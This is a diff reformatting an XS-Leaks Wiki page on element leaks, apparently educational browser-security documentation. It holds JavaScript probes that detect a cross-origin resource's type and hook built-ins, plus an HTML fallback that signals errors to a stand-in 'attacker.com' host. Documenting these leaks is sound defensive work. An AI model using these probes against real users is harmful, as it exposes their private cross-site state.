@@ -1,15 +1,239 @@
-<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Some HTML Elements might be used to leak a portion of data to a cross-origin page. For example, the below media resources can leak information about its size, duration, type.
- HTMLMediaElement leaks the media duration and the buffered times. HTMLVideoElement leaks the videoHeight and videoWidth some browsers may also have webkitVideoDecodedByteCount, webkitAudioDecodedByteCount and webkitDecodedFrameCount getVideoPlaybackQuality() leaks the totalVideoFrames. HTMLImageElement leaks the height and width but if the image is invalid they will be 0 and image."><meta name=theme-color content="#FFFFFF"><meta property="og:title" content="Element leaks"><meta property="og:description" content="Some HTML Elements might be used to leak a portion of data to a cross-origin page. For example, the below media resources can leak information about its size, duration, type.
- HTMLMediaElement leaks the media duration and the buffered times. HTMLVideoElement leaks the videoHeight and videoWidth some browsers may also have webkitVideoDecodedByteCount, webkitAudioDecodedByteCount and webkitDecodedFrameCount getVideoPlaybackQuality() leaks the totalVideoFrames. HTMLImageElement leaks the height and width but if the image is invalid they will be 0 and image."><meta property="og:type" content="article"><meta property="og:url" content="https://xsleaks.dev/docs/attacks/element-leaks/"><meta property="article:section" content="docs"><meta property="article:modified_time" content="2021-06-11T18:03:07+01:00"><title>Element leaks | XS-Leaks Wiki</title><link rel=manifest href=/manifest.json><link rel=icon href=/favicon.png type=image/x-icon><link rel=stylesheet href=/book.min.1c9a9009be3c645cbccbe64eb0a90e28621e4118971d9a502db4aaa9bec96cfc.css integrity="sha256-HJqQCb48ZFy8y+ZOsKkOKGIeQRiXHZpQLbSqqb7JbPw="><script defer src=/en.search.min.3fd7f82651ade342949984a366884780b87e6b9d58b638930da884061f7231a8.js integrity="sha256-P9f4JlGt40KUmYSjZohHgLh+a51YtjiTDaiEBh9yMag="></script><script defer src=/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js integrity="sha256-b2+Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC+NdcPIvZhzk="></script></head><body><input type=checkbox class="hidden toggle" id=menu-control>
-<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><nav><h2 class=book-brand><a href=/><span>XS-Leaks Wiki</span></a></h2><div class=book-search><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><ul><li class=book-section-flat><span>Attacks</span><ul><li><a href=/docs/attacks/xs-search/>XS-Search</a></li><li><a href=/docs/attacks/window-references/>Window References</a></li><li><a href=/docs/attacks/error-events/>Error Events</a></li><li><a href=/docs/attacks/frame-counting/>Frame Counting</a></li><li><a href=/docs/attacks/navigations/>Navigations</a></li><li><a href=/docs/attacks/cache-probing/>Cache Probing</a></li><li><a href=/docs/attacks/element-leaks/ class=active>Element leaks</a></li><li><a href=/docs/attacks/id-attribute/>ID Attribute</a></li><li><a href=/docs/attacks/postmessage-broadcasts/>postMessage Broadcasts</a></li><li><span>Browser Features</span><ul><li><a href=/docs/attacks/browser-features/corb/>CORB Leaks</a></li><li><a href=/docs/attacks/browser-features/corp/>CORP Leaks</a></li></ul></li><li><span>Timing Attacks</span><ul><li><a href=/docs/attacks/timing-attacks/clocks/>Clocks</a></li><li><a href=/docs/attacks/timing-attacks/network-timing/>Network Timing</a></li><li><a href=/docs/attacks/timing-attacks/performance-api/>Performance API</a></li><li><a href=/docs/attacks/timing-attacks/execution-timing/>Execution Timing</a></li><li><a href=/docs/attacks/timing-attacks/hybrid-timing/>Hybrid Timing</a></li><li><a href=/docs/attacks/timing-attacks/connection-pool/>Connection Pool</a></li></ul></li><li><a href=/docs/attacks/experiments/ class=collapsed>Experiments</a></li><li><a href=/docs/attacks/historical/ class=collapsed>Historical</a></li></ul></li><li class=book-section-flat><a href=/docs/defenses/>Defense Mechanisms</a><ul><li><a href=/docs/defenses/design-protections/>Application Design</a><ul><li><a href=/docs/defenses/design-protections/cache-protections/>Cache Protections</a></li><li><a href=/docs/defenses/design-protections/subresource-protections/>Subresource Protections</a></li></ul></li><li><a href=/docs/defenses/opt-in/>Opt-In Mechanisms</a><ul><li><a href=/docs/defenses/opt-in/fetch-metadata/>Fetch Metadata</a></li><li><a href=/docs/defenses/opt-in/coop/>Cross-Origin-Opener-Policy</a></li><li><a href=/docs/defenses/opt-in/corp/>Cross-Origin-Resource-Policy</a></li><li><a href=/docs/defenses/opt-in/xfo/>Framing Protections</a></li><li><a href=/docs/defenses/opt-in/same-site-cookies/>SameSite Cookies</a></li></ul></li><li><a href=/docs/defenses/isolation-policies/>Isolation Policies</a><ul><li><a href=/docs/defenses/isolation-policies/resource-isolation/>Resource Isolation Policy</a></li><li><a href=/docs/defenses/isolation-policies/framing-isolation/>Framing Isolation Policy</a></li><li><a href=/docs/defenses/isolation-policies/navigation-isolation/>Navigation Isolation Policy</a></li><li><a href=/docs/defenses/isolation-policies/strict-isolation/>Strict Isolation Policy</a></li></ul></li><li><a href=/docs/defenses/secure-defaults/>Secure Defaults</a><ul><li><a href=/docs/defenses/secure-defaults/corb/>Cross-Origin Read Blocking</a></li><li><a href=/docs/defenses/secure-defaults/partitioned-cache/>Partitioned HTTP Cache</a></li></ul></li></ul></li><li class=book-section-flat><a href=/docs/contributions/>Contributions</a><ul></ul></li></ul></nav><script>(function(){var a=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(b){localStorage.setItem("menu.scrollTop",a.scrollTop)}),a.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label>
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="Some HTML Elements might be used to leak a portion of data to a cross-origin page. For example, the below media resources can leak information about its size, duration, type.
+ HTMLMediaElement leaks the media duration and the buffered times. HTMLVideoElement leaks the videoHeight and videoWidth some browsers may also have webkitVideoDecodedByteCount, webkitAudioDecodedByteCount and webkitDecodedFrameCount getVideoPlaybackQuality() leaks the totalVideoFrames. HTMLImageElement leaks the height and width but if the image is invalid they will be 0 and image.">
+<meta name=theme-color content="#FFFFFF"><meta property="og:title" content="Element leaks">
+<meta property="og:description" content="Some HTML Elements might be used to leak a portion of data to a cross-origin page. For example, the below media resources can leak information about its size, duration, type.
+ HTMLMediaElement leaks the media duration and the buffered times. HTMLVideoElement leaks the videoHeight and videoWidth some browsers may also have webkitVideoDecodedByteCount, webkitAudioDecodedByteCount and webkitDecodedFrameCount getVideoPlaybackQuality() leaks the totalVideoFrames. HTMLImageElement leaks the height and width but if the image is invalid they will be 0 and image.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://xsleaks.dev/docs/attacks/element-leaks/"><meta property="article:section" content="docs">
+<meta property="article:modified_time" content="2021-06-11T18:03:07+01:00">
+<title>Element leaks | XS-Leaks Wiki</title>
+<link rel=manifest href=/manifest.json>
+<link rel=icon href=/favicon.png type=image/x-icon>
+<link rel=stylesheet href=/book.min.1c9a9009be3c645cbccbe64eb0a90e28621e4118971d9a502db4aaa9bec96cfc.css integrity="sha256-HJqQCb48ZFy8y+ZOsKkOKGIeQRiXHZpQLbSqqb7JbPw=">
+<script defer src=/en.search.min.adf212d3d9775304bd71f39187748f16409ee829813a20a29aafa3de13e297a6.js integrity="sha256-rfIS09l3UwS9cfORh3SPFkCe6CmBOiCimq+j3hPil6Y="></script>
+<script defer src=/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js integrity="sha256-b2+Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC+NdcPIvZhzk="></script>
+</head>
+<body>
+<input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control>
+<main class="container flex">
+<aside class=book-menu>
+<nav>
+<h2 class=book-brand>
+<a href=/><span>XS-Leaks Wiki</span>
+</a>
+</h2>
+<div class=book-search>
+<input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/>
+<div class="book-search-spinner hidden"></div>
+<ul id=book-search-results></ul>
+</div>
+<ul>
+<li class=book-section-flat>
+<span>Attacks</span>
+<ul>
+<li>
+<a href=/docs/attacks/xs-search/>XS-Search</a>
+</li>
+<li>
+<a href=/docs/attacks/window-references/>Window References</a>
+</li>
+<li>
+<a href=/docs/attacks/css-tricks/>CSS Tricks</a>
+</li>
+<li>
+<a href=/docs/attacks/error-events/>Error Events</a>
+</li>
+<li>
+<a href=/docs/attacks/frame-counting/>Frame Counting</a>
+</li>
+<li>
+<a href=/docs/attacks/navigations/>Navigations</a>
+</li>
+<li>
+<a href=/docs/attacks/cache-probing/>Cache Probing</a>
+</li>
+<li>
+<a href=/docs/attacks/element-leaks/ class=active>Element leaks</a>
+</li>
+<li>
+<a href=/docs/attacks/id-attribute/>ID Attribute</a>
+</li>
+<li>
+<a href=/docs/attacks/postmessage-broadcasts/>postMessage Broadcasts</a>
+</li>
+<li>
+<span>Browser Features</span>
+<ul>
+<li>
+<a href=/docs/attacks/browser-features/corb/>CORB Leaks</a>
+</li>
+<li>
+<a href=/docs/attacks/browser-features/corp/>CORP Leaks</a>
+</li>
+</ul>
+</li>
+<li>
+<span>Timing Attacks</span>
+<ul>
+<li>
+<a href=/docs/attacks/timing-attacks/clocks/>Clocks</a>
+</li>
+<li>
+<a href=/docs/attacks/timing-attacks/network-timing/>Network Timing</a>
+</li>
+<li>
+<a href=/docs/attacks/timing-attacks/performance-api/>Performance API</a>
+</li>
+<li>
+<a href=/docs/attacks/timing-attacks/execution-timing/>Execution Timing</a>
+</li>
+<li>
+<a href=/docs/attacks/timing-attacks/hybrid-timing/>Hybrid Timing</a>
+</li>
+<li>
+<a href=/docs/attacks/timing-attacks/connection-pool/>Connection Pool</a>
+</li>
+</ul>
+</li>
+<li>
+<a href=/docs/attacks/experiments/ class=collapsed>Experiments</a>
+</li>
+<li>
+<a href=/docs/attacks/historical/ class=collapsed>Historical</a>
+</li>
+</ul>
+</li>
+<li class=book-section-flat>
+<a href=/docs/defenses/>Defense Mechanisms</a>
+<ul>
+<li>
+<a href=/docs/defenses/design-protections/>Application Design</a>
+<ul>
+<li>
+<a href=/docs/defenses/design-protections/cache-protections/>Cache Protections</a>
+</li>
+<li>
+<a href=/docs/defenses/design-protections/subresource-protections/>Subresource Protections</a>
+</li>
+</ul>
+</li>
+<li>
+<a href=/docs/defenses/opt-in/>Opt-In Mechanisms</a>
+<ul>
+<li>
+<a href=/docs/defenses/opt-in/fetch-metadata/>Fetch Metadata</a>
+</li>
+<li>
+<a href=/docs/defenses/opt-in/coop/>Cross-Origin-Opener-Policy</a>
+</li>
+<li>
+<a href=/docs/defenses/opt-in/corp/>Cross-Origin-Resource-Policy</a>
+</li>
+<li>
+<a href=/docs/defenses/opt-in/xfo/>Framing Protections</a>
+</li>
+<li>
+<a href=/docs/defenses/opt-in/same-site-cookies/>SameSite Cookies</a>
+</li>
+</ul>
+</li>
+<li>
+<a href=/docs/defenses/isolation-policies/>Isolation Policies</a>
+<ul>
+<li>
+<a href=/docs/defenses/isolation-policies/resource-isolation/>Resource Isolation Policy</a>
+</li>
+<li>
+<a href=/docs/defenses/isolation-policies/framing-isolation/>Framing Isolation Policy</a>
+</li>
+<li>
+<a href=/docs/defenses/isolation-policies/navigation-isolation/>Navigation Isolation Policy</a>
+</li>
+<li>
+<a href=/docs/defenses/isolation-policies/strict-isolation/>Strict Isolation Policy</a>
+</li>
+</ul>
+</li>
+<li>
+<a href=/docs/defenses/secure-defaults/>Secure Defaults</a>
+<ul>
+<li>
+<a href=/docs/defenses/secure-defaults/corb/>Cross-Origin Read Blocking</a>
+</li>
+<li>
+<a href=/docs/defenses/secure-defaults/partitioned-cache/>Partitioned HTTP Cache</a>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class=book-section-flat>
+<a href=/docs/contributions/>Contributions</a>
+<ul>
+</ul>
+</li>
+</ul>
+</nav>
+<script>(function(){var a=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(b){localStorage.setItem("menu.scrollTop",a.scrollTop)}),a.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+</aside>
+<div class=book-page>
+<header class=book-header>
+<div class="flex align-center justify-between">
+<label for=menu-control>
+<img src=/svg/menu.svg class=book-icon alt=Menu>
+</label>
 <strong>Element leaks</strong>
-<label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#abusing-corb>Abusing CORB</a></li><li><a href=#abusing-getcomputedstyle>Abusing getComputedStyle</a></li><li><a href=#pdf>PDF</a></li><li><a href=#script-tag>Script tag</a></li><li><a href=#when-javascript-cant-be-used>When Javascript can’t be used</a></li><li><a href=#defense>Defense</a></li><li><a href=#references>References</a></li></ul></nav></aside></header><article class=markdown><h1>Element leaks</h1><div>Abuse
-<a href=/abuse/htmlelement/>HTMLElement</a></div><div>Category
-<a href=/category/attack/>Attack</a></div><div>Defenses
-<a href=/defenses/samesite-cookies/>SameSite Cookies</a></div><p><p>Some HTML Elements might be used to leak a portion of data to a cross-origin page.
-For example, the below media resources can leak information about its size, duration, type.</p><ul><li><a href=https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement>HTMLMediaElement</a> leaks the media <code>duration</code> and the <code>buffered</code> times.</li><li><a href=https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement>HTMLVideoElement</a> leaks the <code>videoHeight</code> and <code>videoWidth</code>
-some browsers may also have <code>webkitVideoDecodedByteCount</code>, <code>webkitAudioDecodedByteCount</code> and <code>webkitDecodedFrameCount</code></li><li><a href=https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality>getVideoPlaybackQuality()</a> leaks the <code>totalVideoFrames</code>.</li><li><a href=https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement>HTMLImageElement</a> leaks the <code>height</code> and <code>width</code> but if the image is invalid they will be 0
-and <a href=https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/decode><code>image.decode()</code></a> will get rejected.</li></ul><p>It&rsquo;s possible to differentiate between media types via unique property for a given media type. For example, it is <code>videoWidth</code> for a <code>&lt;video></code>, or <code>duration</code> for an <code>&lt;audio></code>. The below snippet shows an example code that returns the type of a resource.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#ff79c6>async</span> <span style=color:#8be9fd;font-style:italic>function</span> getType(url) {
+<label for=toc-control>
+<img src=/svg/toc.svg class=book-icon alt="Table of Contents">
+</label>
+</div>
+<aside class="hidden clearfix">
+<nav id=TableOfContents>
+<ul>
+<li><a href=#abusing-corb>Abusing CORB</a></li>
+<li><a href=#abusing-getcomputedstyle>Abusing getComputedStyle</a></li>
+<li><a href=#pdf>PDF</a></li>
+<li><a href=#script-tag>Script tag</a></li>
+<li><a href=#when-javascript-cant-be-used>When Javascript can’t be used</a></li>
+<li><a href=#defense>Defense</a></li>
+<li><a href=#references>References</a></li>
+</ul>
+</nav>
+</aside>
+</header>
+<article class=markdown>
+<h1>
+Element leaks
+</h1>
+<div>
+Abuse
+<a href=/abuse/htmlelement/>HTMLElement</a>
+</div>
+<div>
+Category
+<a href=/category/attack/>Attack</a>
+</div>
+<div>
+Defenses
+<a href=/defenses/samesite-cookies/>SameSite Cookies</a>
+</div>
+<p><p>Some HTML Elements might be used to leak a portion of data to a cross-origin page.
+For example, the below media resources can leak information about its size, duration, type.</p>
+<ul>
+<li><a href=https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement>HTMLMediaElement</a> leaks the media <code>duration</code> and the <code>buffered</code> times.</li>
+<li><a href=https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement>HTMLVideoElement</a> leaks the <code>videoHeight</code> and <code>videoWidth</code>
+some browsers may also have <code>webkitVideoDecodedByteCount</code>, <code>webkitAudioDecodedByteCount</code> and <code>webkitDecodedFrameCount</code></li>
+<li><a href=https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality>getVideoPlaybackQuality()</a> leaks the <code>totalVideoFrames</code>.</li>
+<li><a href=https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement>HTMLImageElement</a> leaks the <code>height</code> and <code>width</code> but if the image is invalid they will be 0
+and <a href=https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/decode><code>image.decode()</code></a> will get rejected.</li>
+</ul>
+<p>It&rsquo;s possible to differentiate between media types via unique property for a given media type. For example, it is <code>videoWidth</code> for a <code>&lt;video></code>, or <code>duration</code> for an <code>&lt;audio></code>. The below snippet shows an example code that returns the type of a resource.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#ff79c6>async</span> <span style=color:#8be9fd;font-style:italic>function</span> getType(url) {
     <span style=color:#6272a4>// Detect if resource is audio or video
 </span><span style=color:#6272a4></span>    <span style=color:#8be9fd;font-style:italic>let</span> media <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>document</span>.createElement(<span style=color:#f1fa8c>&#34;video&#34;</span>);
     media.src <span style=color:#ff79c6>=</span> url;
@@ -25,10 +249,14 @@ and <a href=https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/de
     <span style=color:#ff79c6>await</span> <span style=color:#ff79c6>new</span> <span style=color:#8be9fd;font-style:italic>Promise</span>(r=&gt;setTimeout(r,<span style=color:#bd93f9>50</span>));
     <span style=color:#ff79c6>if</span> (image.width) <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#34;image&#34;</span>;
 }
-</code></pre></div><h2 id=abusing-corb>Abusing CORB
-<a class=anchor href=#abusing-corb>#</a></h2><p><a href=https://xsleaks.dev/docs/attacks/browser-features/corb/>CORB</a> is a feature of Chrome that makes responses empty if the wrong content type is used.
+</code></pre></div><h2 id=abusing-corb>
+Abusing CORB
+<a class=anchor href=#abusing-corb>#</a>
+</h2>
+<p><a href=https://xsleaks.dev/docs/attacks/browser-features/corb/>CORB</a> is a feature of Chrome that makes responses empty if the wrong content type is used.
 This means that if the type is wrong it’s not cached.
-An <code>ifCached</code> function can be found in <a href=https://xsleaks.dev/docs/attacks/cache-probing/>Cache Probing</a> article.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#ff79c6>async</span> <span style=color:#8be9fd;font-style:italic>function</span> isType(url, type <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;script&#34;</span>) {
+An <code>ifCached</code> function can be found in <a href=https://xsleaks.dev/docs/attacks/cache-probing/>Cache Probing</a> article.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#ff79c6>async</span> <span style=color:#8be9fd;font-style:italic>function</span> isType(url, type <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;script&#34;</span>) {
   <span style=color:#8be9fd;font-style:italic>let</span> error <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>false</span>;
   <span style=color:#6272a4>// Purge url
 </span><span style=color:#6272a4></span>  <span style=color:#ff79c6>await</span> ifCached(url, <span style=color:#ff79c6>true</span>);
@@ -45,9 +273,13 @@ An <code>ifCached</code> function can be found in <a href=https://xsleaks.dev/do
 </span><span style=color:#6272a4></span>  <span style=color:#ff79c6>if</span> (error) <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>false</span>
   <span style=color:#ff79c6>return</span> ifCached(url);
 }
-</code></pre></div><h2 id=abusing-getcomputedstyle>Abusing getComputedStyle
-<a class=anchor href=#abusing-getcomputedstyle>#</a></h2><p><a href=https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle>getComputedStyle</a> can be used to read an embedded to the current page CSS style sheets. Including those loaded from different origins.
-This function just checks if there has been a style applied to the body.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#ff79c6>async</span> <span style=color:#8be9fd;font-style:italic>function</span> isCSS(url) {
+</code></pre></div><h2 id=abusing-getcomputedstyle>
+Abusing getComputedStyle
+<a class=anchor href=#abusing-getcomputedstyle>#</a>
+</h2>
+<p><a href=https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle>getComputedStyle</a> can be used to read an embedded to the current page CSS style sheets. Including those loaded from different origins.
+This function just checks if there has been a style applied to the body.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#ff79c6>async</span> <span style=color:#8be9fd;font-style:italic>function</span> isCSS(url) {
     <span style=color:#8be9fd;font-style:italic>let</span> link <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>document</span>.createElement(<span style=color:#f1fa8c>&#39;link&#39;</span>);
     link.rel <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;stylesheet&#39;</span>;
     link.type <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;text/css&#39;</span>;
@@ -59,30 +291,107 @@ This function just checks if there has been a style applied to the body.</p><div
     <span style=color:#8be9fd;font-style:italic>document</span>.head.removeChild(link);
     <span style=color:#ff79c6>return</span> (style1 <span style=color:#ff79c6>!==</span> style2);
 }
-</code></pre></div><h2 id=pdf>PDF
-<a class=anchor href=#pdf>#</a></h2><p>There are <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113">Open URL Parameters</a> that allow some control over the content such as <code>zoom</code>, <code>view</code>, <code>page</code>, <code>toolbar</code>.<br>For chrome, a PDF can be detected with <a href=https://xsleaks.dev/docs/attacks/frame-counting/>frame counting</a> because an <code>embed</code> is used internally.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#ff79c6>async</span> <span style=color:#8be9fd;font-style:italic>function</span> isPDF(url) {
+</code></pre></div><h2 id=pdf>
+PDF
+<a class=anchor href=#pdf>#</a>
+</h2>
+<p>There are <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113">Open URL Parameters</a> that allow some control over the content such as <code>zoom</code>, <code>view</code>, <code>page</code>, <code>toolbar</code>.<br>
+For chrome, a PDF can be detected with <a href=https://xsleaks.dev/docs/attacks/frame-counting/>frame counting</a> because an <code>embed</code> is used internally.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#ff79c6>async</span> <span style=color:#8be9fd;font-style:italic>function</span> isPDF(url) {
     <span style=color:#8be9fd;font-style:italic>let</span> w <span style=color:#ff79c6>=</span> open(url);
     <span style=color:#ff79c6>await</span> <span style=color:#ff79c6>new</span> <span style=color:#8be9fd;font-style:italic>Promise</span>(resolve =&gt; setTimeout(resolve, <span style=color:#bd93f9>500</span>));
     <span style=color:#8be9fd;font-style:italic>let</span> result <span style=color:#ff79c6>=</span> (w.length <span style=color:#ff79c6>===</span> <span style=color:#bd93f9>1</span>);
     w.close();
     <span style=color:#ff79c6>return</span> result;
 }
-</code></pre></div><blockquote class="book-hint2 warning"><p class="hint-title warning"><svg class="book-icon"><use href="/svg/hint-icons.svg#warning-notice"/></svg><span>warning</span></p>There will be false positives if the page has other embeds.</blockquote><h2 id=script-tag>Script tag
-<a class=anchor href=#script-tag>#</a></h2><p>When a cross-origin script is included on a page it&rsquo;s not directly possible to read its contents. However, if a script uses any built-in functions, it&rsquo;s possible to overwrite them and read their arguments which might leak valuable information <sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#8be9fd;font-style:italic>let</span> hook <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>window</span>.<span style=color:#8be9fd;font-style:italic>Array</span>.prototype.push;
+</code></pre></div>
+<blockquote class="book-hint2 warning">
+<p class="hint-title warning">
+<svg class="book-icon"><use href="/svg/hint-icons.svg#warning-notice"/></svg><span>warning</span></p>
+There will be false positives if the page has other embeds.
+</blockquote>
+<h2 id=script-tag>
+Script tag
+<a class=anchor href=#script-tag>#</a>
+</h2>
+<p>When a cross-origin script is included on a page it&rsquo;s not directly possible to read its contents. However, if a script uses any built-in functions, it&rsquo;s possible to overwrite them and read their arguments which might leak valuable information <sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#8be9fd;font-style:italic>let</span> hook <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>window</span>.<span style=color:#8be9fd;font-style:italic>Array</span>.prototype.push;
 <span style=color:#8be9fd;font-style:italic>window</span>.<span style=color:#8be9fd;font-style:italic>Array</span>.prototype.push <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>function</span>() {
     console.log(<span style=color:#ff79c6>this</span>);
     <span style=color:#ff79c6>return</span> hook.apply(<span style=color:#ff79c6>this</span>, arguments);
 }
-</code></pre></div><h2 id=when-javascript-cant-be-used>When Javascript can’t be used
-<a class=anchor href=#when-javascript-cant-be-used>#</a></h2><p>If JavaScript is disabled it&rsquo;s still possible to leak some information about cross-origin resources. For example, an <code>&lt;object></code> can be used to detect whether a resource responds with <em>Error Code</em>. What happens is that if a resource <code>//example.org/resource</code> returns an error in <code>&lt;object data=//example.org/resource>fallback&lt;/object></code> then <code>fallback</code> will be rendered <sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup> <sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup>. It&rsquo;s possible to inject another <code>&lt;object></code> inside that will leak the information to an outside server, or detect it with CSS <sup id=fnref:4><a href=#fn:4 class=footnote-ref role=doc-noteref>4</a></sup>.
-The below code embeds <code>//example.org/404</code> and if it responds with <em>Error</em> then a request to <code>//attacker.com/?error</code> is also made as a fallback.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#ff79c6>object</span> <span style=color:#50fa7b>data</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;//example.com/404&#34;</span>&gt;
+</code></pre></div><h2 id=when-javascript-cant-be-used>
+When Javascript can’t be used
+<a class=anchor href=#when-javascript-cant-be-used>#</a>
+</h2>
+<p>If JavaScript is disabled it&rsquo;s still possible to leak some information about cross-origin resources. For example, an <code>&lt;object></code> can be used to detect whether a resource responds with <em>Error Code</em>. What happens is that if a resource <code>//example.org/resource</code> returns an error in <code>&lt;object data=//example.org/resource>fallback&lt;/object></code> then <code>fallback</code> will be rendered <sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup> <sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup>. It&rsquo;s possible to inject another <code>&lt;object></code> inside that will leak the information to an outside server, or detect it with CSS <sup id=fnref:4><a href=#fn:4 class=footnote-ref role=doc-noteref>4</a></sup>.
+The below code embeds <code>//example.org/404</code> and if it responds with <em>Error</em> then a request to <code>//attacker.com/?error</code> is also made as a fallback.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#ff79c6>object</span> <span style=color:#50fa7b>data</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;//example.com/404&#34;</span>&gt;
   &lt;<span style=color:#ff79c6>object</span> <span style=color:#50fa7b>data</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;//attacker.com/?error&#34;</span>&gt;&lt;/<span style=color:#ff79c6>object</span>&gt;
 &lt;/<span style=color:#ff79c6>object</span>&gt;
-</code></pre></div><h2 id=defense>Defense
-<a class=anchor href=#defense>#</a></h2><pre><code>| Attack Alternative | [SameSite Cookies (Lax)](https://xsleaks.dev/docs/defenses/opt-in/same-site-cookies/) | [COOP](https://xsleaks.dev/docs/defenses/opt-in/coop/) | [Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/) |                                          [Isolation Policies](https://xsleaks.dev/docs/defenses/isolation-policies/)                                           |
+</code></pre></div><h2 id=defense>
+Defense
+<a class=anchor href=#defense>#</a>
+</h2>
+<pre><code>| Attack Alternative | [SameSite Cookies (Lax)](https://xsleaks.dev/docs/defenses/opt-in/same-site-cookies/) | [COOP](https://xsleaks.dev/docs/defenses/opt-in/coop/) | [Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/) |                                          [Isolation Policies](https://xsleaks.dev/docs/defenses/isolation-policies/)                                           |
 | :----------------: | :--------------------------------------------------------------------------------: | :-------------------------------------------------: | :---------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------: |
